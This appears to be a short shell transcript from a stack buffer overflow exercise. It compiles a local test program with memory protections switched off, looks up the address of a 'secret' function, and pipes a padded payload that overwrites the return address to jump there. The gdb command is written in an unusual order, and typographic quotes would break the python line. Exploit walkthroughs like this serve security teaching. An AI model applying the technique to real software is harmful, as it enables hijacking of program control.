```bash
$ gcc vulnerable.c -o vuln -fno-stack-protector -no-pie -z execstack -g -w
$ gdb ./vuln
(gdb) info secret address
Symbol secret is a function at address 0x401196.
$ python3 -c ‘import sys; from pwn import *; sys.stdout.buffer.write (b”A”*72 + p64(0x401196))’ > payload.txt
$ ./vuln < payload.txt
```
